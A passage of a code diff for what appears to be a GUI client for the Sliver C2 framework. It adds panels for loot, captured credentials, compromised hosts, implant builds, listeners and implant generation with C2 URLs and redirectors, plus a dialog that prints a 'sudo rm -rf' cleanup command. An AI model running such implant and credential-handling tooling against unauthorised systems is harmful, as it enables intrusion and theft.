+       <div style="overflow:auto;flex:1" id="loot-list"><div style="padding:10px;color:var(--muted)">Loading...</div></div>
+     </div>`);
+  // Use window.refreshLootList so features-extra.js's Preview-button
+  // augmentation (installed by wrapping the global) actually runs.
+  (window.refreshLootList || refreshLootList)();
+  setTimeout(() => {
+    document.getElementById('loot-export-all')?.addEventListener('click', async () => {
+      const dir = await pickDownloadFolder('Where should the loot ZIP be written?');
+      if (!dir) return;
+      const p = progressToast('Fetching + zipping loot…');
+      const r = await App().ExportAllLootZIP(dir).catch(e => ({ error: String(e) }));
+      if (r.error) p.fail(r.error); else p.done('Saved ' + r.path);
+    });
+  }, 0);
 }
 
-// HTTP C2 profile editor — load the profile as JSON, edit, save back.
+// HTTP C2 profile editor - load the profile as JSON, edit, save back.
 async function openC2Editor(name) {
-  openViewPanel('_c2edit', `HTTP C2 Profile${name ? ' — ' + name : ''}`,
+  openViewPanel('_c2edit', `HTTP C2 Profile${name ? ' - ' + name : ''}`,
     `<div style="display:flex;flex-direction:column;gap:8px;flex:1;min-height:0">
        <p style="color:var(--muted);font-size:11px;margin:0">Edit the profile JSON below. To clone it, change the <code>"name"</code> field and click <b>Save as new</b>. Malformed JSON is rejected by the teamserver.</p>
        <textarea id="c2-json" class="notes-area" style="flex:1;min-height:260px;font-family:var(--mono);font-size:11px;line-height:1.5" spellcheck="false">Loading…</textarea>
@@ -2535,8 +3133,17 @@ async function openC2Editor(name) {
 async function refreshLootList() {
   const el = document.getElementById('loot-list'); if (!el) return;
   const loot = await App().GetLoot().catch(() => []);
-  if (!loot?.length) { el.innerHTML = '<div style="padding:10px;color:var(--muted)">No loot.</div>'; return; }
-  el.innerHTML = loot.map(l => `<div style="padding:4px 10px;font-size:12.5px;display:flex;gap:10px;align-items:center;border-bottom:1px solid var(--border)"><span style="flex:1">${esc(l.name)}</span><span style="color:var(--muted)">${esc(l.type)}</span><span style="color:var(--muted);font-family:var(--mono)">${esc(l.id.slice(0,10))}</span><button class="btn small" onclick="lootDownload('${esc(l.id)}')">Download</button><button class="btn small danger" onclick="App().DeleteLoot('${esc(l.id)}').then(refreshLootList)">Del</button></div>`).join('');
+  const count = document.getElementById('loot-count');
+  if (count) count.textContent = (loot?.length || 0) + ' item(s)';
+  if (!loot?.length) {
+    el.innerHTML = `<div class="empty-state">
+      <div class="empty-title">No loot yet</div>
+      <div class="empty-body">Loot is anything the operator saves centrally on the teamserver - downloaded files, screenshots, credential dumps. Run <code>download --loot &lt;path&gt;</code> from an agent shell or use the <b>screenshot</b> command.</div>
+      <div class="empty-actions"><button class="btn small" onclick="switchView('sessions')">Open Sessions</button></div>
+    </div>`;
+    return;
+  }
+  el.innerHTML = loot.map(l => `<div style="padding:4px 10px;font-size:12.5px;display:flex;gap:10px;align-items:center;border-bottom:1px solid var(--border)"><span style="flex:1">${esc(l.name)}</span><span style="color:var(--muted)">${esc(l.type)}</span><span style="color:var(--muted);font-family:var(--mono)">${esc(l.id.slice(0,10))}</span><button class="btn small" onclick="lootDownload('${esc(l.id)}')">Download</button><button class="btn small danger" onclick="deleteLootRow('${esc(l.id)}','${esc(l.name||l.id)}')">Del</button></div>`).join('');
 }
 async function lootDownload(lootID) {
   const r = await App().DownloadLoot(lootID).catch(e => ({ error: String(e) }));
@@ -2570,8 +3177,14 @@ function openCredsPanel() {
 async function refreshCredsList() {
   const el = document.getElementById('creds-list'); if (!el) return;
   const creds = await App().ListCreds().catch(() => []);
-  if (!creds.length) { el.innerHTML = '<div style="padding:10px;color:var(--muted)">No credentials stored.</div>'; return; }
-  el.innerHTML = creds.map(c => `<div style="padding:5px 10px;font-size:12.5px;display:flex;gap:12px;align-items:center;border-bottom:1px solid var(--border)"><span style="flex:1;color:var(--info)">${esc(c.username)}</span><span style="flex:1;font-family:var(--mono)">${esc(c.plaintext||c.hash||'')}</span>${c.cracked?'<span style="color:var(--ok)">cracked</span>':''}<button class="btn small danger" onclick="App().DeleteCred('${esc(c.id)}').then(refreshCredsList)">Del</button></div>`).join('');
+  if (!creds.length) {
+    el.innerHTML = `<div class="empty-state">
+      <div class="empty-title">No credentials stored</div>
+      <div class="empty-body">The Sliver server keeps a central credential store. Add creds manually with the form above, or capture them from beacons/sessions and they'll appear here.</div>
+    </div>`;
+    return;
+  }
+  el.innerHTML = creds.map(c => `<div style="padding:5px 10px;font-size:12.5px;display:flex;gap:12px;align-items:center;border-bottom:1px solid var(--border)"><span style="flex:1;color:var(--info)">${esc(c.username)}</span><span style="flex:1;font-family:var(--mono)">${esc(c.plaintext||c.hash||'')}</span>${c.cracked?'<span style="color:var(--ok)">cracked</span>':''}<button class="btn small danger" onclick="deleteCredRow('${esc(c.id)}','${esc(c.username||c.id)}')">Del</button></div>`).join('');
 }
 
 // ── Hosts panel ─────────────────────────────────────────────────────────────
@@ -2582,8 +3195,59 @@ function openHostsPanel() {
 async function refreshHostsList() {
   const el = document.getElementById('hosts-list'); if (!el) return;
   const hosts = await App().ListHosts().catch(() => []);
-  if (!hosts.length) { el.innerHTML = '<div style="padding:10px;color:var(--muted)">No hosts in the database.</div>'; return; }
-  el.innerHTML = hosts.map(h => `<div style="padding:5px 10px;font-size:12.5px;display:flex;gap:12px;align-items:center;border-bottom:1px solid var(--border)"><span style="flex:1;color:var(--info)">${esc(h.hostname)}</span><span style="flex:1;color:var(--muted)">${esc(h.os)}</span><span style="color:var(--muted);font-family:var(--mono)">${esc((h.uuid||'').slice(0,8))}</span><span style="color:var(--muted)">${esc(h.firstSeen)}</span><button class="btn small danger" onclick="App().DeleteHost('${esc(h.id)}').then(refreshHostsList)">Del</button></div>`).join('');
+  if (!hosts.length) {
+    el.innerHTML = `<div class="empty-state">
+      <div class="empty-title">No hosts recorded</div>
+      <div class="empty-body">Sliver tracks each unique target host it has seen an implant on. This list fills automatically the first time a beacon or session checks in from a fresh box.</div>
+    </div>`;
+    return;
+  }
+  el.innerHTML = hosts.map(h => `<div style="padding:5px 10px;font-size:12.5px;display:flex;gap:12px;align-items:center;border-bottom:1px solid var(--border)"><span style="flex:1;color:var(--info)">${esc(h.hostname)}</span><span style="flex:1;color:var(--muted)">${esc(h.os)}</span><span style="color:var(--muted);font-family:var(--mono)">${esc((h.uuid||'').slice(0,8))}</span><span style="color:var(--muted)">${esc(h.firstSeen)}</span><button class="btn small danger" onclick="deleteHostRow('${esc(h.id)}','${esc(h.hostname)}')">Del</button></div>`).join('');
+}
+// deleteHostRow - confirm + error toast + refresh. Old inline promise
+// silently swallowed errors (no .catch, no user feedback), which read as
+// "delete not working" when the RPC actually failed.
+// Delete wrappers with confirm + error toast. Inline `App().Delete…().then(refresh)`
+// swallowed errors (no .catch), which the operator saw as "Del button broken"
+// when the RPC actually failed. Each wrapper here confirms, calls, toasts
+// on either outcome, and refreshes the panel.
+window.deleteLootRow = async function (id, name) {
+  const ok = await uiConfirm('Delete loot <b>' + esc(name) + '</b>?', { title: 'Delete loot', okLabel: 'Delete', danger: true });
+  if (!ok) return;
+  const err = await App().DeleteLoot(id).catch(e => String(e));
+  if (err) toast('err', 'Delete failed: ' + err); else toast('ok', 'Loot removed');
+  (window.refreshLootList || refreshLootList)();
+};
+window.deleteCredRow = async function (id, username) {
+  const ok = await uiConfirm('Delete credential for <b>' + esc(username) + '</b>?', { title: 'Delete credential', okLabel: 'Delete', danger: true });
+  if (!ok) return;
+  const err = await App().DeleteCred(id).catch(e => String(e));
+  if (err) toast('err', 'Delete failed: ' + err); else toast('ok', 'Credential removed');
+  refreshCredsList();
+};
+window.deleteImplantProfileRow = async function (name) {
+  const ok = await uiConfirm('Delete implant profile <b>' + esc(name) + '</b>?', { title: 'Delete profile', okLabel: 'Delete', danger: true });
+  if (!ok) return;
+  const err = await App().DeleteImplantProfile(name).catch(e => String(e));
+  if (err) toast('err', 'Delete failed: ' + err); else toast('ok', 'Profile removed');
+  refreshProfilesList();
+};
+window.killJobRow = async function (id, name, port) {
+  const ok = await uiConfirm('Kill listener <b>' + esc(name) + ' :' + port + '</b>?<br/><br/><span style="color:var(--muted);font-size:11px">Live implants that call this listener will stop reaching the teamserver.</span>',
+    { title: 'Kill listener', okLabel: 'Kill', danger: true });
+  if (!ok) return;
+  const err = await App().KillJob(id).catch(e => String(e));
+  if (err) toast('err', 'Kill failed: ' + err); else toast('ok', 'Listener stopped');
+  refreshListenerList();
+};
+
+window.deleteHostRow = async function (id, hostname) {
+  const ok = await uiConfirm('Remove host record for <b>' + esc(hostname || id) + '</b> from the teamserver database?<br/><br/><span style="color:var(--muted);font-size:11px">This only forgets the host in Sliver\'s DB. The live agent (if any) stays.</span>',
+    { title: 'Delete host', okLabel: 'Delete', danger: true });
+  if (!ok) return;
+  const err = await App().DeleteHost(id).catch(e => String(e));
+  if (err) toast('err', 'Delete failed: ' + err); else toast('ok', 'Host removed');
+  refreshHostsList();
 }
 
 function openBuildsPanel() {
@@ -2593,18 +3257,216 @@ function openBuildsPanel() {
 async function refreshBuildsList() {
   const el = document.getElementById('builds-list'); if (!el) return;
   const builds = await App().GetBuildHistory().catch(() => []);
-  if (!builds?.length) { el.innerHTML = '<div style="padding:10px;color:var(--muted)">No builds yet.</div>'; return; }
+  if (!builds?.length) {
+    el.innerHTML = `<div class="empty-state">
+      <div class="empty-title">No implant builds yet</div>
+      <div class="empty-body">Generate an implant to fill this list. Each build is stored on the teamserver and can be re-downloaded here without rebuilding.</div>
+      <div class="empty-actions"><button class="btn small" onclick="switchView('generate')">Open Generate</button></div>
+    </div>`;
+    return;
+  }
   el.innerHTML = builds.map(b => `<div style="padding:4px 10px;font-size:12.5px;display:flex;gap:10px;align-items:center;border-bottom:1px solid var(--border)"><span style="flex:1">${esc(b.name)}</span><span style="color:var(--muted)">${esc(b.goos)}/${esc(b.goarch)}</span><span style="color:var(--muted)">${esc(b.format)}</span><span style="color:var(--muted);font-family:var(--mono);max-width:180px;overflow:hidden;text-overflow:ellipsis">${esc((b.c2Urls||[]).join(','))}</span><button class="btn small" onclick="buildRegen('${esc(b.name)}')">Download</button><button class="btn small danger" onclick="deleteBuild('${esc(b.name)}')">Del</button></div>`).join('');
 }
 async function deleteBuild(name) {
-  if (!(await uiConfirm(`Delete build ${esc(name)}?`, { title: 'Delete build', okLabel: 'Delete', danger: true }))) return;
-  await App().DeleteBuild(name)
-    .then(() => { toast('ok', `Deleted build ${name}`); refreshBuildsList(); })
-    .catch(e => toast('err', 'Delete failed: ' + e));
+  if (!(await uiConfirm(`Delete build <b>${esc(name)}</b>?<br/><br/><span style="color:var(--muted);font-size:11px">Removes the teamserver's stored build record + on-disk artefacts.</span>`, { title: 'Delete build', okLabel: 'Delete', danger: true }))) return;
+  const err = await App().DeleteBuild(name).catch(e => String(e));
+  if (!err) { toast('ok', `Deleted build ${name}`); refreshBuildsList(); return; }
+  // Sliver server bug: `rename import dir: target exists` - the server
+  // tries to move the build's source tree into a trash location, but the
+  // trash already has an orphan from a prior failed delete. The teamserver
+  // DB row is deleted but the on-disk tree lingers. Explain to the operator
+  // and hand them the exact server-side cleanup command.
+  if (/rename import dir|target exists/i.test(err)) {
+    const trash = err.match(/(\/[^\s]+)$/);
+    const path = trash ? trash[1] : '~/.sliver/slivers/…/' + name;
+    await uiConfirm(
+      `Sliver's server-side delete succeeded partially but left an orphan directory on disk:<br/><code style="word-break:break-all">${esc(path)}</code><br/><br/>` +
+      `Future builds using the same name will fail with the same error until the orphan is removed. On the C2 host:<br/>` +
+      `<pre style="background:var(--panel-alt);padding:6px;border-radius:4px;font-size:11px">sudo rm -rf ${esc(path.replace(/\/src\/.+$/, ''))}</pre>` +
+      `<br/>The Builds panel will refresh - this build is no longer selectable in the GUI even though the disk state remains.`,
+      { title: 'Server orphan (Sliver bug)', okLabel: 'Got it', danger: false }
+    );
+    refreshBuildsList();
+    return;
+  }
+  toast('err', 'Delete failed: ' + err);
 }
+// pickDownloadFolder resolves a save directory: uses the per-teamserver
+// remembered value if there is one, otherwise prompts. The prompt exposes
+// both a native folder browser (via OpenDirectoryDialog - different code
+// path than the OpenFileDialog that crashes on some Windows configs) and a
+// text-input fallback for when the native picker cannot be trusted.
+async function pickDownloadFolder(prompt) {
+  const dirKey = (persistKey || 'sliver-gui:default') + ':download-dir';
+  let dir = '';
+  try { dir = localStorage.getItem(dirKey) || ''; } catch (e) {}
+  if (dir) return dir;
+  const chosen = await folderChooser(prompt || 'Where should generated implants be saved on this machine?');
+  if (!chosen) return '';
+  try { localStorage.setItem(dirKey, chosen); } catch (e) {}
+  window.__lastFolderChosen__ = chosen; // seed next open at the picked dir
+  return chosen;
+}
+
+// folderChooser draws an in-app directory browser - text input at the top
+// (for pasting a known path) plus a click-through folder tree fed entirely
+// from Go filesystem calls. No native OS dialog is involved anywhere in
+// this flow - runtime.OpenDirectoryDialog crashes the WebView2 process on
+// certain Windows Common Dialog COM configs (confirmed on this operator's
+// machine), so we work around it by walking the filesystem ourselves.
+//
+// Returns the chosen absolute path (or empty string on cancel).
+async function folderChooser(message) {
+  return new Promise(async resolve => {
+    const ov = document.createElement('div');
+    ov.style.cssText = 'position:fixed;inset:0;z-index:9999;display:flex;align-items:center;justify-content:center;background:rgba(0,0,0,.5)';
+    ov.innerHTML = `<div style="width:min(680px,94vw);height:min(560px,86vh);background:var(--panel,var(--bg));border:1px solid var(--border);border-radius:8px;padding:14px 16px 12px;box-shadow:0 8px 30px rgba(0,0,0,.5);display:flex;flex-direction:column">
+      <div style="font-weight:600;font-size:13.5px;margin-bottom:4px">Choose a folder</div>
+      <div style="font-size:12px;color:var(--muted);margin-bottom:8px">${esc(message)}</div>
+      <div style="display:flex;gap:6px;margin-bottom:8px;align-items:center">
+        <button id="fc-up" class="btn small" title="Up one level">↑</button>
+        <button id="fc-home" class="btn small" title="Home">Home</button>
+        <select id="fc-roots" style="min-width:80px" title="Drives"></select>
+        <input id="fc-input" type="text" style="flex:1;padding:6px 9px;background:var(--bg);color:var(--fg);border:1px solid var(--border);border-radius:5px;font-size:12px;font-family:var(--mono)" placeholder="Current folder - edit and press Enter to jump"/>
+      </div>
+      <div id="fc-list" style="flex:1;overflow:auto;background:var(--bg);border:1px solid var(--border);border-radius:5px;font-size:12.5px;font-family:var(--mono)"></div>
+      <div id="fc-msg" style="font-size:11px;color:var(--muted);min-height:14px;margin-top:6px"></div>
+      <div style="display:flex;gap:8px;justify-content:space-between;align-items:center;margin-top:10px">
+        <label style="font-size:11.5px;color:var(--muted)"><input type="checkbox" id="fc-new" style="vertical-align:middle"/> create folder if it doesn't exist</label>
+        <div style="display:flex;gap:8px">
+          <button id="fc-cancel" class="btn small">Cancel</button>
+          <button id="fc-ok" class="btn small accent">Save this folder</button>
+        </div>
+      </div>
+    </div>`;
+    document.body.appendChild(ov);
+    const inp   = ov.querySelector('#fc-input');
+    const list  = ov.querySelector('#fc-list');
+    const msg   = ov.querySelector('#fc-msg');
+    const roots = ov.querySelector('#fc-roots');
+    let current = '';
+
+    const done = v => { ov.remove(); document.removeEventListener('keydown', onKey); resolve(v); };
+    const onKey = e => { if (e.key === 'Escape') done(''); };
+
+    async function load(path) {
+      msg.textContent = 'Loading…';
+      const r = await App().ListDirectory(path || '', true).catch(e => ({ error: String(e), entries: [] }));
+      current = r.path || path || '';
+      inp.value = current;
+      if (r.error) {
+        msg.innerHTML = `<span style="color:var(--warn)">${esc(r.error)}</span>`;
+        list.innerHTML = `<div style="padding:12px;color:var(--muted);text-align:center">Can't read this folder.</div>`;
+        return;
+      }
+      const parent = r.parent || '';
+      msg.textContent = r.entries.length + ' subfolder(s)';
+      // The backend hands us a filepath.Join'd absolute path per entry, so
+      // the frontend never has to manually splice separators - that was the
+      // source of the "D:\ + C2 Infra → D:C2 Infra" bug (drive-root special
+      // case had a broken concat).
+      list.innerHTML =
+        (parent ? `<div class="fc-row fc-up" data-path="${esc(parent)}" style="padding:5px 10px;cursor:pointer;border-bottom:1px solid var(--border);color:var(--muted)">📁 <b>..</b> <span style="color:var(--muted);font-size:11px">(${esc(parent)})</span></div>` : '') +
+        (r.entries.length
+          ? r.entries.map(e => `<div class="fc-row" data-path="${esc(e.fullPath || '')}" style="padding:5px 10px;cursor:pointer;border-bottom:1px solid rgba(42,46,59,.4)">📁 ${esc(e.name)}</div>`).join('')
+          : `<div style="padding:12px;color:var(--muted);text-align:center">(no subfolders)</div>`);
+      list.querySelectorAll('.fc-row').forEach(row => {
+        row.addEventListener('dblclick', () => {
+          const abs = row.dataset.path;
+          if (abs) load(abs);
+        });
+        row.addEventListener('click', () => {
+          list.querySelectorAll('.fc-row').forEach(x => x.style.background = '');
+          row.style.background = 'rgba(77,159,230,.15)';
+          // Single click also updates the path bar so the operator can
+          // "Save this folder" on a selected subfolder without double-click.
+          if (row.dataset.path && !row.classList.contains('fc-up')) {
+            inp.value = row.dataset.path;
+          }
+        });
+      });
+    }
+
+    inp.addEventListener('keydown', e => { if (e.key === 'Enter') { e.preventDefault(); load(inp.value.trim()); } });
+    ov.querySelector('#fc-up').addEventListener('click', async () => {
+      const r = await App().ListDirectory(current, true).catch(() => null);
+      if (r && r.parent) load(r.parent);
+    });
+    ov.querySelector('#fc-home').addEventListener('click', async () => {
+      const h = await App().HomeDirectory().catch(() => '');
+      load(h || '');
+    });
+    // Populate the drive/root dropdown.
+    try {
+      const rootsList = await App().ListDriveRoots();
+      if (rootsList && rootsList.length) {
+        roots.innerHTML = '<option value="">drives…</option>' + rootsList.map(r => `<option value="${esc(r)}">${esc(r)}</option>`).join('');
+        roots.addEventListener('change', () => { if (roots.value) load(roots.value); });
+      } else {
+        roots.style.display = 'none';
+      }
+    } catch (e) { roots.style.display = 'none'; }
+
+    ov.querySelector('#fc-cancel').addEventListener('click', () => done(''));
+    ov.querySelector('#fc-ok').addEventListener('click', async () => {
+      const picked = (inp.value || '').trim();
+      if (!picked) return;
+      const createIfMissing = ov.querySelector('#fc-new').checked;
+      if (createIfMissing) {
+        const r = await App().EnsureDirectory(picked).catch(e => ({ error: String(e) }));
+        if (r && r.error) { msg.innerHTML = '<span style="color:var(--accent)">' + esc(r.error) + '</span>'; return; }
+        done(typeof r === 'string' ? r : picked);
+        return;
+      }
+      // Otherwise verify it exists before returning.
+      const chk = await App().ListDirectory(picked, true).catch(() => null);
+      if (!chk || chk.error) { msg.innerHTML = '<span style="color:var(--accent)">Path unreadable - tick "create folder if it doesn\'t exist" to make it.</span>'; return; }
+      done(chk.path || picked);
+    });
+    ov.addEventListener('click', e => { if (e.target === ov) done(''); });
+    document.addEventListener('keydown', onKey);
+
+    // Start at whatever the operator picked last, else home.
+    const startFrom = (window.__lastFolderChosen__ || '');
+    load(startFrom);
+  });
+}
+window.folderChooser = folderChooser;
+window.pickDownloadFolder = pickDownloadFolder;
+
+// buildRegen downloads a previously-built implant to disk without invoking
+// Wails' native SaveFileDialog. First run per teamserver asks for a target
+// directory (via the shared folderChooser - text input + optional native
+// Browse); that path is persisted in localStorage and reused silently.
 async function buildRegen(name) {
-  const r = await App().RegenerateBuild(name).catch(e => ({ error: String(e) }));
-  toast(r.error ? 'err' : 'ok', r.error ? `Regenerate failed: ${r.error}` : `Saved to ${r.path}`);
+  const dir = await pickDownloadFolder('Where should generated implants be saved on this machine?');
+  if (!dir) return;
+  const r = await App().RegenerateBuildToPath(name, dir).catch(e => ({ error: String(e) }));
+  if (r.error) {
+    toast('err', `Save failed: ${r.error}`);
+    return;
+  }
+  toast('ok', `Saved to ${r.path}`);
+}
+// changeDownloadDir clears the saved download dir so buildRegen prompts again.
+// Exposed via the command palette for operators who want to relocate.
+async function changeDownloadDir() {
+  const dirKey = (persistKey || 'sliver-gui:default') + ':download-dir';
+  const cur = (() => { try { return localStorage.getItem(dirKey) || ''; } catch (e) { return ''; } })();
+  const answer = await uiDialog({
+    title: 'Download folder',
+    message: `Where should generated implants be saved on this machine?<br/><br/>Current: <code>${esc(cur || '(not set)')}</code>`,
+    input: true,
+    placeholder: cur,
+    okLabel: 'Save',
+  });
+  if (answer === null) return;
+  const v = String(answer).trim();
+  try {
+    if (v) localStorage.setItem(dirKey, v);
+    else localStorage.removeItem(dirKey);
+  } catch (e) {}
+  toast('ok', v ? `Download dir set to ${v}` : 'Download dir cleared');
 }
 
 function profilesContent() {
@@ -2662,8 +3524,8 @@ async function refreshProfilesList() {
   if (!targets.length) return;
   const profs = await App().ListImplantProfiles().catch(() => []);
   const html = !profs?.length
-    ? '<div style="padding:10px;color:var(--muted)">No saved profiles yet — create one above.</div>'
-    : profs.map(p => `<div style="padding:5px 10px;font-size:12.5px;display:flex;gap:10px;align-items:center;border-bottom:1px solid var(--border)"><span style="flex:1">${esc(p.name)}</span><span style="color:var(--muted)">${esc(p.goos)}/${esc(p.goarch)}</span><span style="color:var(--muted)">${esc(p.format)}</span><span style="color:var(--muted);font-family:var(--mono)">${esc(p.c2Url||'')}</span><button class="btn small" onclick='genFromProfile(${JSON.stringify(p)})'>Generate</button><button class="btn small danger" onclick="App().DeleteImplantProfile('${esc(p.name)}').then(refreshProfilesList)">Del</button></div>`).join('');
+    ? '<div style="padding:10px;color:var(--muted)">No saved profiles yet - create one above.</div>'
+    : profs.map(p => `<div style="padding:5px 10px;font-size:12.5px;display:flex;gap:10px;align-items:center;border-bottom:1px solid var(--border)"><span style="flex:1">${esc(p.name)}</span><span style="color:var(--muted)">${esc(p.goos)}/${esc(p.goarch)}</span><span style="color:var(--muted)">${esc(p.format)}</span><span style="color:var(--muted);font-family:var(--mono)">${esc(p.c2Url||'')}</span><button class="btn small" onclick='genFromProfile(${JSON.stringify(p)})'>Generate</button><button class="btn small danger" onclick="deleteImplantProfileRow('${esc(p.name)}')">Del</button></div>`).join('');
   targets.forEach(el => el.innerHTML = html);
 }
 // pinProfiles docks a live profiles list into the bottom console.
@@ -2739,8 +3601,14 @@ async function wireListeners() {
 async function refreshListenerList() {
   const el = document.getElementById('ls-list'); if (!el) return;
   const jobs = await App().ListJobs().catch(() => []);
-  if (!jobs?.length) { el.innerHTML = '<div style="color:var(--muted);font-size:12px">None active</div>'; return; }
-  el.innerHTML = jobs.map(j => `<div style="padding:4px 0;font-size:12.5px;display:flex;justify-content:space-between;border-bottom:1px solid var(--border)"><span>${esc(j.name)} (${esc(j.protocol)} :${j.port})</span><button class="btn small danger" onclick="App().KillJob(${j.id}).then(refreshListenerList)">Kill</button></div>`).join('');
+  if (!jobs?.length) {
+    el.innerHTML = `<div class="empty-state" style="padding:14px">
+      <div class="empty-title">No active listeners</div>
+      <div class="empty-body">Start one with the form on the left - HTTP/HTTPS for redirector setups, mTLS for direct, DNS for slow-and-quiet.</div>
+    </div>`;
+    return;
+  }
+  el.innerHTML = jobs.map(j => `<div style="padding:4px 0;font-size:12.5px;display:flex;justify-content:space-between;border-bottom:1px solid var(--border)"><span>${esc(j.name)} (${esc(j.protocol)} :${j.port})</span><button class="btn small danger" onclick="killJobRow(${j.id},'${esc(j.name)}',${j.port})">Kill</button></div>`).join('');
 }
 
 function openGeneratePanel() {
@@ -2754,7 +3622,20 @@ function openGeneratePanel() {
       <div class="gen-field"><label>Arch</label><select name="goarch"><option value="amd64">amd64</option><option value="386">386</option><option value="arm64">arm64</option></select></div>
     </div>
     <div class="gen-row"><div class="gen-field" style="flex:2"><label>From Listener</label><select id="gen-listener"><option value="">- select an active listener -</option></select></div></div>
-    <div class="gen-row"><div class="gen-field" style="flex:2"><label>C2 URL</label><input name="c2Url" placeholder="mtls://ip:port or https://ip:port" required/></div></div>
+    <div class="gen-row"><div class="gen-field" style="flex:2">
+      <label>C2 URL <span style="color:var(--muted);font-weight:400;font-size:11px">- replace with your redirector's public URL if using one</span></label>
+      <div style="display:flex;gap:6px">
+        <input name="c2Url" list="c2url-history" placeholder="mtls://ip:port or https://redirector" required style="flex:1"/>
+        <button type="button" id="gen-test-btn" class="btn small" title="Probe this URL through your network path">Test</button>
+      </div>
+      <datalist id="c2url-history"></datalist>
+    </div></div>
+    <div class="gen-row" id="gen-test-panel" style="display:none"><div class="gen-field" style="flex:2"><div id="gen-test-body" class="result-box" style="white-space:pre-wrap;font-size:12px"></div></div></div>
+    <div class="gen-row" id="gen-http-c2-row" style="display:none"><div class="gen-field" style="flex:2">
+      <label>HTTP C2 Profile <span style="color:var(--muted);font-weight:400;font-size:11px">- controls URIs, User-Agent, and any custom headers baked into the beacon</span></label>
+      <select name="httpC2Profile" id="gen-http-c2"><option value="">(teamserver default)</option></select>
+      <div id="gen-http-c2-summary" style="font-size:11.5px;color:var(--muted);margin-top:4px;line-height:1.5"></div>
+    </div></div>
     <div class="gen-row">
       <label class="check-label"><input type="checkbox" name="debug"/> Debug</label>
       <label class="check-label"><input type="checkbox" name="beacon" id="gbeacon"/> Beacon mode</label>
@@ -2766,48 +3647,376 @@ function openGeneratePanel() {
     <button type="submit" class="btn accent">Generate</button>
     <div id="gen-status" class="gen-status" style="display:none"><div class="spinner"></div><span>Building...</span></div>
     <div id="gen-result" class="result-box"></div>
+    <div id="gen-deploy" style="display:none;margin-top:10px;padding:10px;border:1px solid var(--border);border-radius:6px;background:var(--panel,var(--bg))"></div>
   </form>`;
   openViewPanel('_generate', 'Generate', content);
   setTimeout(async () => {
     document.getElementById('gbeacon')?.addEventListener('change', function() {
       document.getElementById('gbeacon-opts').style.display = this.checked ? 'flex' : 'none';
     });
-    // Populate "From Listener" dropdown; auto-fill C2 URL from the first one.
+    // Populate "From Listener" dropdown from the richer details endpoint so we
+    // can render "scheme://host:port  (Job N)" labels instead of bare URLs.
+    // A userTyped flag stops later listener changes from clobbering a URL the
+    // operator hand-edited (e.g. swapped an internal :8443 for a redirector).
     const sel = document.getElementById('gen-listener');
     const c2 = document.querySelector('#gen-form [name="c2Url"]');
-    const urls = await App().ListenerC2Options().catch(() => []);
-    if (sel) {
-      sel.innerHTML = urls.length
-        ? '<option value="">- select an active listener -</option>' + urls.map(u => `<option value="${esc(u)}">${esc(u)}</option>`).join('')
-        : '<option value="">- no active listeners -</option>';
-      if (urls.length && c2 && !c2.value.trim()) { sel.value = urls[0]; c2.value = urls[0]; }
-      sel.addEventListener('change', () => { if (sel.value && c2) c2.value = sel.value; });
+    const httpC2Row = document.getElementById('gen-http-c2-row');
+    const httpC2Sel = document.getElementById('gen-http-c2');
+    const httpC2Summary = document.getElementById('gen-http-c2-summary');
+    let listenerOpts = [];
+    let userTypedC2 = false;
+    let lastAutoFill = '';
+    try { listenerOpts = await App().ListenerC2Details() || []; }
+    catch (e) {
+      // Backend without the new binding - fall back to the legacy URL-only list
+      // so the form still works after a partial deploy.
+      const urls = await App().ListenerC2Options().catch(() => []);
+      listenerOpts = urls.map(u => ({ url: u, label: u, scheme: (u.split('://')[0] || '').toLowerCase() }));
     }
+    if (sel) {
+      sel.innerHTML = listenerOpts.length
+        ? '<option value="">- select an active listener -</option>' + listenerOpts.map((o, i) => `<option value="${i}">${esc(o.label || o.url)}</option>`).join('')
+        : '<option value="">- no active listeners -</option>';
+      // Auto-select the first HTTP/S listener when present, else the first of
+      // any kind. Redirector setups are HTTP; picking one avoids the mtls-only
+      // trap where a fresh operator selects the operator port by mistake.
+      if (listenerOpts.length && c2 && !c2.value.trim()) {
+        let pick = listenerOpts.findIndex(o => o.scheme === 'http' || o.scheme === 'https');
+        if (pick < 0) pick = 0;
+        sel.value = String(pick);
+        c2.value = listenerOpts[pick].url;
+        lastAutoFill = listenerOpts[pick].url;
+        refreshHTTPC2Row();
+      }
+      sel.addEventListener('change', () => {
+        const idx = parseInt(sel.value);
+        if (!Number.isInteger(idx) || !listenerOpts[idx]) return;
+        // Only overwrite the C2 URL when the operator hasn't hand-edited it
+        // away from whatever we last auto-filled. Preserves a manually-typed
+        // redirector URL across listener re-picks.
+        if (!userTypedC2 || !c2.value.trim() || c2.value.trim() === lastAutoFill) {
+          c2.value = listenerOpts[idx].url;
+          lastAutoFill = listenerOpts[idx].url;
+          userTypedC2 = false;
+        }
+        refreshHTTPC2Row();
+      });
+    }
+    c2?.addEventListener('input', () => {
+      userTypedC2 = c2.value.trim() !== lastAutoFill;
+      refreshHTTPC2Row();
+    });
+
+    // HTTP C2 profile picker - only meaningful for http/https URLs. When the
+    // operator switches to a non-HTTP scheme (mtls, dns, wg), the whole row
+    // hides so we don't imply the choice affects those transports.
+    function schemeOf(u) { const m = String(u||'').match(/^([a-z0-9+\-\.]+):\/\//i); return m ? m[1].toLowerCase() : ''; }
+    async function refreshHTTPC2Row() {
+      const scheme = schemeOf(c2?.value);
+      if (scheme === 'http' || scheme === 'https') {
+        httpC2Row.style.display = 'flex';
+        if (!httpC2Sel.dataset.loaded) {
+          try {
+            const names = await App().ListHTTPC2ProfileNames() || [];
+            httpC2Sel.innerHTML = '<option value="">(teamserver default)</option>' +
+              names.map(n => `<option value="${esc(n)}">${esc(n)}</option>`).join('');
+            httpC2Sel.dataset.loaded = '1';
+          } catch (e) {
+            httpC2Sel.innerHTML = '<option value="">(teamserver default)</option>';
+          }
+        }
+      } else {
+        httpC2Row.style.display = 'none';
+        httpC2Summary.textContent = '';
+      }
+    }
+    httpC2Sel?.addEventListener('change', async () => {
+      const n = httpC2Sel.value;
+      if (!n) { httpC2Summary.textContent = ''; return; }
+      httpC2Summary.textContent = 'Loading profile…';
+      try {
+        const s = await App().GetHTTPC2ProfileSummary(n);
+        const hdrLine = (s.headers && s.headers.length)
+          ? s.headers.map(h => `${h.name}: ${h.value}${h.method ? ` [${h.method}]` : ''}`).join('  ·  ')
+          : '(no custom request headers)';
+        const uri = s.sampleUri || (s.uriSamples && s.uriSamples[0] ? '/' + s.uriSamples[0] : '(random)');
+        // Warnings first so the operator can't miss them - a profile with
+        // NonceQueryLength=0 crashes the beacon on target with no telemetry
+        // (Sliver's `secure.Intn: non-positive n` panic). If the profile is
